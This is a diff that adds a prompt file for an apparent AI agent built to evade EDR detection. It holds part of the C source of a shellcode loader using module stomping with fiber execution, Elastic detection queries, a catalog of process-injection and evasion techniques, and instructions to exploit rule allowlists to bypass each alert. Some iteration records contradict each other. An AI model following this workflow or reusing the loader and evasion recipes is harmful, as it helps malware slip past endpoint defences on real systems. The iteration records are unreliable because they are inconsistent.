@@ -1,0 +1,438 @@
+# EDR Rule Gap Analysis
+
+## Context
+We are analyzing EDR detection rules to identify logical gaps and design improvements.
+A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+
+## Memory & History
+### Iteration History
+Iter 1: [outcome=exec_fail]
+Technique: bugfix (Fix the file-open / section-create access rights so the kernel permits the image section:  1. **Open the sacrificial DLL with execute access.** In the)
+Triggered Rules: None
+Analysis: `NtCreateSection` returned `0xC0000022` (`STATUS_ACCESS_DENIED`). The failure is in the *file-open* stage of the module-stomping chain, not the mapping stage. When you build an image section from a file (`SEC_IMAGE`), the kernel requires the backing file handle to have been opened with **execute acc
+
+Iter 2: [outcome=compile_fail]
+Technique: bugfix (Fix the file-open access contract so it matches the section's requested protection. Specifically:  1. **Open the sacrificial DLL with execute access.*)
+Triggered Rules: None
+Analysis: The compilation failed with four `C2065: undeclared identifier` errors — all NT/DDK-level constants that are *not* exposed by the standard SDK headers (`windows.h`):  - `OBJ_CASE_INSENSITIVE` (line 195) — lives in `ntdef.h`/`ntddk.h`, not pulled in by `windows.h`. - `FILE_SYNCHRONOUS_IO_NONALERT` (l
+
+Iter 2: [outcome=compile_fail]
+Technique: bugfix (Add the missing constant definitions (guarded, so they don't clash if a DDK header is ever included) near the other NT local definitions. Do **not** a)
+Triggered Rules: None
+Analysis: This is a **linker error (LNK2019 / LNK1120)**, not a syntax error. The C source compiled fine into an object file; the failure is at the link stage. Seven symbols are unresolved:  - `NtCreateSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`, `NtProtectVirtualMemory`, `NtClose`, `NtOpenFile`, `
+
+Iter 2: [outcome=detected]
+Technique: bugfix (Fix the linkage in two parts — one for the prototype declarations, one for the link line — while keeping the execution logic (module stomping + fiber))
+Triggered Rules: Elastic FileScore / Malicious File alert, Suspicious System Module Image Hollowing, Hollow Image Behavior via Native API, AMSI Bypass from Suspicious Module
+Analysis: Pending AI Analysis
+
+Iter 3: [outcome=detected]
+Technique: module_stomping (Standard implementation)
+Triggered Rules: Elastic FileScore / Malicious File alert
+Analysis: Pending AI Analysis
+
+### Rule Analysis
+
+    Solved Rules: Hollow Image Behavior via Native API, Suspicious System Module Image Hollowing, AMSI Bypass from Suspicious Module
+    Persistent Rules: Elastic FileScore / Malicious File alert(x2)
+    Active Rules Details:
+    - Rule: Suspicious Access to LSA Secrets Registry | APIs: process.executable | Logic: registry where event.action != "modification" and
+ registry.path : ("HKLM\\SECURITY\\Policy\\Secrets\\*", "HKLM\\SECURITY\\CACHE*") and process.executable != null and
+ user.id : "S-1-5-18" and
+ not process.executable : ("?:\\Windows\\System32\\lsass.exe",
+                           "\\Device\\HarddiskVolume?\\Windows\\System32\\lsass.exe",
+                           "\\Device\\HarddiskVolume??\\Windows\\System32\\lsass.exe",
+                           "?:\\Program Files (x86)\\DesktopCentral_Agent\\bin\\ToolsIQ.exe",
+                           "?:\\Program Files\\Citrix\\PvsVm\\Service\\PvsVmAgent.exe",
+                           "?:\\Windows\\Provisioning\\Autopilot\\DiagonsticAnalysis.pif",
+                           "?:\\Program Files\\RepairTech\\LiveAgent\\SyncroLive.Agent.Runner.exe",
+                           "?:\\Program Files\\Common Files\\Adobe\\Creative Cloud Libraries\\CCLibrary.exe",
+                           "?:\\Windows\\System32\\SpecopsClient\\SecuredBrowserNet\\SecuredBrowserDotNetLauncher.exe",
+                           "?:\\Program Files (x86)\\Tripwire\\TFS\\Bin\\tripwire.exe",
+                           "?:\\Windows\\regedit.exe",
+                           "?:\\Program Files\\Dell\\Dell Data Protection\\Encryption\\EmsService.exe",
+                           "?:\\Program Files (x86)\\Imperva\\RemoteAgent\\RemoteAgentCtrl.exe",
+                           "?:\\Program Files (x86)\\Lenovo\\System Update\\UACSdk.exe",
+                           "?:\\Program Files (x86)\\CentraStage\\CagService.exe",
+                           "?:\\Program Files\\McAfee\\Endpoint Security\\Adaptive Threat Protection\\mfeatp.exe",
+                           "?:\\Program Files\\Bitdefender\\Endpoint Security\\EPSecurityService.exe",
+                           // SenseIR.exe spawning powershell
+                           "?:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                           "?:\\Program Files\\Neverfail\\R2\\bin\\NFServerR2.exe",
+                           "C:\\Program Files (x86)\\AutoElevate\\AutoElevateAgent.exe",
+                           "C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-*\\components\\osqueryd.exe") and
+ not (process.executable : "?:\\Windows\\System32\\dsregcmd.exe" and registry.path : "HKLM\\SECURITY\\Policy\\Secrets\\DSREGCMD\\MutexName") and
+ not (process.executable : "?:\\Windows\\LTSvc\\LTSVC.exe" and registry.path : "HKLM\\SECURITY\\Cache\\NL$1") and
+ not (process.executable : ("?:\\Program Files (x86)\\*.exe", "?:\\Program Files\\*.exe") and
+      registry.path : "HKLM\\SECURITY\\Policy\\Secrets\\$MACHINE.ACC\\CupdTime\\") and
+ not registry.path : "HKLM\\SECURITY\\Policy\\Secrets\\DSREGCMD\\MutexName" and
+ not (process.code_signature.subject_name :
+            ("Musarubra US LLC", "Bitdefender SRL", "Illusive Networks LTD", "Comodo Security Solutions, Inc.",
+             "Proofpoint, Inc.", "Portnox Security LLC", "Urs Beckmann") and
+      process.code_signature.trusted == true) and
+
+ /* 8.6+ logs also failed attempts which generate some noise */
+ not event.outcome == "failure" and
+
+ not registry.path : ("HKLM\\SECURITY\\Policy\\Secrets\\_SC_Citrix Encryption Service\\*",
+                      "HKLM\\SECURITY\\Policy\\Secrets\\$MACHINE.ACC\\CupdTime\\")
+
+
+    
+
+### Active Approach Status
+unknown_approach: 1/3 attempts (target: unknown)
+module_stomping: 1/3 attempts (target: Elastic FileScore / Malicious File alert)
+
+### Banned Approaches (Do NOT attempt these)
+bugfix
+
+
+    ## Previous Test Results
+    Iteration: 3
+    Status: detected
+    Exit Code: 3221225477
+    Output Snippet: 
+    Error Snippet: Process crashed with exit code 3221225477 (0xC0000005)
+    Compile Success: True
+    Previous Strategy Plan:
+    # EDR Rule Gap Analysis — Module Stomping + Fiber (Iter 3)
+
+## Execution Failure Context
+
+Iter 3 hit the target: the loader **compiled, linked, and executed** — and was detected by **all four rules**. This is a *successful detection*, not a crash. The task is now to find the logical gaps in each rule and modify the *same* technique (module stomping + fiber) to slip through.
+
+The key realization: all four rules share the same **core detection primitive** — `process.Ext.api.behaviors == "hollow_im
+
+    ## Previous Code (C source that was tested)
+    ```c
+    /*
+ * x64 shellcode loader - Module Stomping (image section) + Fiber execution.
+ * Reads raw shellcode from argv[1]. No embedded payload bytes.
+ *
+ * Compile:
+ *   cl.exe /nologo /O2 /GS- loader.c
+ *
+ * Iteration 3 fix (linkage):
+ *   The previous build failed at the LINK stage with 7x LNK2019 for the
+ *   hand-declared NT/Rtl prototypes.  Fixes applied (still in effect):
+ *     1. #pragma comment(lib, "ntdll.lib")
+ *     2. Runtime GetProcAddress resolution of all seven functions.
+ *
+ * Iteration 4 fix (detection evasion, per Analysis Agent):
+ *     1. Sacrificial DLL relocated to C:\Program Files\ (rule exclusion).
+ *     2. RW->RX flip chunked into 8192-byte VirtualProtect calls.
+ *     3. Flip uses the Win32 VirtualProtect wrapper.
+ *     4. Fiber execution unchanged.
+ *
+ * Iteration 4b fix (code review):
+ *     - Removed non-DLL / non-portable candidates from the sacrificial
+ *       list (wordpad.exe, TipBand.dll, wmp.dll, ieproxy.dll).  These were
+ *       frequently absent on modern hosts, causing the fallback chain to
+ *       land on C:\Windows\System32\amsi.dll -- which is exactly the
+ *       predicate the hollowing rules match.
+ *     - System32 fallback now uses only DLLs that are NOT the AMSI
+ *       predicate (winhttp.dll, crypt32.dll, dbghelp.dll).
+ */
+
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wchar.h>
+
+/* Force ntdll.lib onto the link line even if the harness drops /link args. */
+#pragma comment(lib, "ntdll.lib")
+
+/* ------------------------------------------------------------------ */
+/* Local NT definitions (self-contained; no <winternl.h> dependency).  */
+/* ------------------------------------------------------------------ */
+
+typedef LONG NTSTATUS;
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+
+#ifndef _ACCESS_MASK_DEFINED
+typedef ULONG ACCESS_MASK;
+#define _ACCESS_MASK_DEFINED
+#endif
+
+#ifndef _UNICODE_STRING_DEFINED
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+#define _UNICODE_STRING_DEFINED
+#endif
+
+#ifndef _OBJECT_ATTRIBUTES_DEFINED
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+#define _OBJECT_ATTRIBUTES_DEFINED
+#endif
+
+#ifndef _IO_STATUS_BLOCK_DEFINED
+typedef struct _IO_STATUS_BLOCK {
+    NTSTATUS  Status;
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+#define _IO_STATUS_BLOCK_DEFINED
+#endif
+
+#ifndef _PHANDLE_DEFINED
+typedef HANDLE *PHANDLE;
+#define _PHANDLE_DEFINED
+#endif
+
+#ifndef _SECTION_INHERIT_DEFINED
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
+#define _SECTION_INHERIT_DEFINED
+#endif
+
+#ifndef OBJ_INHERIT
+#define OBJ_INHERIT                  0x00000002L
+#endif
+#ifndef OBJ_CASE_INSENSITIVE
+#define OBJ_CASE_INSENSITIVE         0x00000040L
+#endif
+#ifndef FILE_SYNCHRONOUS_IO_NONALERT
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020L
+#endif
+#ifndef FILE_NON_DIRECTORY_FILE
+#define FILE_NON_DIRECTORY_FILE      0x00000040L
+#endif
+
+#define InitializeObjectAttributes(p, n, a, r, s) { \
+    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
+    (p)->RootDirectory = (r);                       \
+    (p)->Attributes = (a);                          \
+    (p)->ObjectName = (n);                          \
+    (p)->SecurityDescriptor = (s);                  \
+    (p)->SecurityQualityOfService = NULL;           \
+}
+
+/* ------------------------------------------------------------------ */
+/* NT prototypes, resolved dynamically at runtime.                     */
+/* ------------------------------------------------------------------ */
+
+typedef NTSTATUS (NTAPI *pNtCreateSection)(
+    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+
+typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
+    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
+    PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
+
+typedef NTSTATUS (NTAPI *pNtOpenFile)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
+    PIO_STATUS_BLOCK, ULONG, ULONG);
+
+typedef PIMAGE_NT_HEADERS (NTAPI *pRtlImageNtHeader)(PVOID);
+
+static pNtCreateSection        dyn_NtCreateSection        = NULL;
+static pNtMapViewOfSection     dyn_NtMapViewOfSection     = NULL;
+static pNtUnmapViewOfSection   dyn_NtUnmapViewOfSection   = NULL;
+static pNtClose                dyn_NtClose                = NULL;
+static pNtOpenFile             dyn_NtOpenFile             = NULL;
+static pRtlImageNtHeader       dyn_RtlImageNtHeader       = NULL;
+
+static int resolve_nt_functions(void)
+
+
+... (code truncated for length)
+    ```
+    
+
+## Detection Details
+### Alert 1: Elastic FileScore / Malicious File alert
+- Detector: elastic_local_log
+- Severity: medium
+- Rule ID: N/A
+- Process: loader_module_stomping_fiber_3.exe (pid=None)
+- File: C:\Users\mslr74l\Desktop\dev\behaviorBypassAgent\output\20260929_204435_module_stomping_fiber\iter_3\loader_module_stomping_fiber_3.exe
+- Description: None
+- **Matched local rule**:
+    - Name: Suspicious Access to LSA Secrets Registry
+    - File: credential_access_suspicious_access_to_lsa_secrets_registry.toml
+    - Rule ID: c5ee8453-bc89-42e7-a414-1ba4bec85119
+    - Detection query:
+        registry where event.action != "modification" and
+         registry.path : ("HKLM\\SECURITY\\Policy\\Secrets\\*", "HKLM\\SECURITY\\CACHE*") and process.executable != null and
+         user.id : "S-1-5-18" and
+         not process.executable : ("?:\\Windows\\System32\\lsass.exe",
+                                   "\\Device\\HarddiskVolume?\\Windows\\System32\\lsass.exe",
+                                   "\\Device\\HarddiskVolume??\\Windows\\System32\\lsass.exe",
+                                   "?:\\Program Files (x86)\\DesktopCentral_Agent\\bin\\ToolsIQ.exe",
+                                   "?:\\Program Files\\Citrix\\PvsVm\\Service\\PvsVmAgent.exe",
+                                   "?:\\Windows\\Provisioning\\Autopilot\\DiagonsticAnalysis.pif",
+                                   "?:\\Program Files\\RepairTech\\LiveAgent\\SyncroLive.Agent.Runner.exe",
+                                   "?:\\Program Files\\Common Files\\Adobe\\Creative Cloud Libraries\\CCLibrary.exe",
+                                   "?:\\Windows\\System32\\SpecopsClient\\SecuredBrowserNet\\SecuredBrowserDotNetLauncher.exe",
+                                   "?:\\Program Files (x86)\\Tripwire\\TFS\\Bin\\tripwire.exe",
+                                   "?:\\Windows\\regedit.exe",
+                                   "?:\\Program Files\\Dell\\Dell Data Protection\\Encryption\\EmsService.exe",
+                                   "?:\\Program Files (x86)\\Imperva\\RemoteAgent\\RemoteAgentCtrl.exe",
+                                   "?:\\Program Files (x86)\\Lenovo\\System Update\\UACSdk.exe",
+                                   "?:\\Program Files (x86)\\CentraStage\\CagService.exe",
+                                   "?:\\Program Files\\McAfee\\Endpoint Security\\Adaptive Threat Protection\\mfeatp.exe",
+                                   "?:\\Program Files\\Bitdefender\\Endpoint Security\\EPSecurityService.exe",
+                                   // SenseIR.exe spawning powershell
+                                   "?:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                                   "?:\\Program Files\\Neverfail\\R2\\bin\\NFServerR2.e
+        ... (truncated)
+    - Parsed detection patterns:
+    - API/Behavior indicators: process.executable
+    - File paths: C:\\Program Files (x86)\\AutoElevate\\AutoElevateAgent.exe, C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-*\\components\\osqueryd.exe, ?:\\Windows\\System32\\dsregcmd.exe, HKLM\\SECURITY\\Policy\\Secrets\\DSREGCMD\\MutexName, ?:\\Windows\\LTSvc\\LTSVC.exe, HKLM\\SECURITY\\Cache\\NL$1, HKLM\\SECURITY\\Policy\\Secrets\\$MACHINE.ACC\\CupdTime\\, HKLM\\SECURITY\\Policy\\Secrets\\DSREGCMD\\MutexName
+    - Process names: ?:\\Windows\\System32\\dsregcmd.exe, ?:\\Windows\\LTSvc\\LTSVC.exe
+    - Behavior keywords: code_signature, powershell
+    - Exclusions/allowlists: (
+
+## Task
+1. **Analyze** the execution failure or detection alert using the provided telemetry
+2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+- Identify the rule's detection logic and scope
+- **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+- **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+- **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+
+## Exclusion Strategy Constraints
+When analyzing Known_Exclusions, adhere to these rules:
+- **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+- **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+- **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+## Example of Analysis Logic
+When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+- **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+- **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+  - `c:\\windows\\assembly\\nativeimages_*.dll`
+  - `c:\\program files\\*`
+  The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+**Requirements for Prompt Construction:**
+Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+## Standard Testing Methodologies
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber** [USER-PREFERRED]: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **module_stomping_fiber**
+
+
+## Techniques Knowledge Base
+Curated implementation notes for the enabled/preferred techniques. Prefer these concrete patterns over generic code.
+### module_stomping_fiber [USER-PREFERRED]
+# Module Stomping + Fiber (recommended combination)
+
+## Goal
+Combine a file-backed stomped module (address hygiene) with fiber-based execution (no thread telemetry). Workshop-verified: this combination produced no Elastic alerts for a calc-spawning payload.
+
+## Pattern
+```c
+// A. Stomp via image-section mapping (see module_stomping_section_mapping.md)
+//    -> execAddr = base + offset inside the mapped DLL's .text
+
+// B. Execute through a fiber
+ConvertThreadToFiber(NULL);
+LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execAddr, NULL);
+SwitchToFiber(fiber);          // payload runs inside the stomped module
+```
+
+## Why the combination matters
+- **Stomping alone**: solves the "unbacked/private memory" call-stack problem but `CreateThread execAddr`-style launches still emit thread-start events pointing at weird offsets inside a module.
+- **Fiber alone**: kills thread telemetry, but a fiber start address in private memory is itself suspicious.
+- **Together**: the fiber's start address resolves to a *file-backed, signed module path* AND no thread-start event is emitted. Both detection surfaces go quiet simultaneously.
+
+## Detection surface (Elastic)
+- Residual risk: `VirtualProtect`/`NtProtectVirtualMemory` events during the RW->RX flip — keep them targeted at the image region, not private memory.
+- `NtMapViewOfSection` with `SEC_IMAGE` shows the DLL path — choose a DLL whose path is covered by the rule's allowlist when one exists.
+
+## Pitfalls
+- The fiber shares the caller's thread; an unhandled exception inside the payload kills the loader process — the `exec_failed` branch then fires with no EDR alert, which is fine (fix code, not stealth).
+- Fiber start routine signature is `void WINAPI (PVOID)` — payload entry must not expect C argc/argv.
+
+
+    ## Language Specific Constraints
+    - Emit one complete compilable translation unit including ALL required headers; no stubs, TODOs, or pseudocode. Verify braces balance before finishing the file.
+    - Use `int main(int argc, char* argv[])` and read the payload path from argv[1]. If you choose wmain/wWinMain (wide args), you MUST use wide CRT functions (_wfopen, wcslen, wprintf); passing wchar_t* argv to narrow functions like fopen/printf %s reads garbage such as just "C".
+    - The target is x64 Windows and the code must compile cleanly under MSVC cl.exe. Do not use GCC-only extensions (e.g. __attribute__) and do not use C++ constructs.
+    - Prefer documented Win32 APIs from <windows.h>. If undocumented NT APIs (Nt*/Zw*/Rtl* functions or types like OBJECT_ATTRIBUTES/IO_STATUS_BLOCK) are required, you MUST declare every typedef, enum, and function prototype yourself; <winternl.h> alone does NOT define most of them.
+    - Keep helper declarations above their call sites and ensure every identifier used is declared; cl.exe does not tolerate forward references to undeclared functions.
+    - The loader's only job is executing the payload bytes from argv[1]; never spawn or search for the observable target process (calc.exe/CalculatorApp.exe) yourself — the payload produces it. If a technique needs a host process, spawn a real executable (e.g. C:\Windows\System32\notepad.exe), NOT a UWP alias like CalculatorApp.exe which cannot be CreateProcess'd (error 2).
+
+## Output Format
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+[Repeat for each triggered rule]
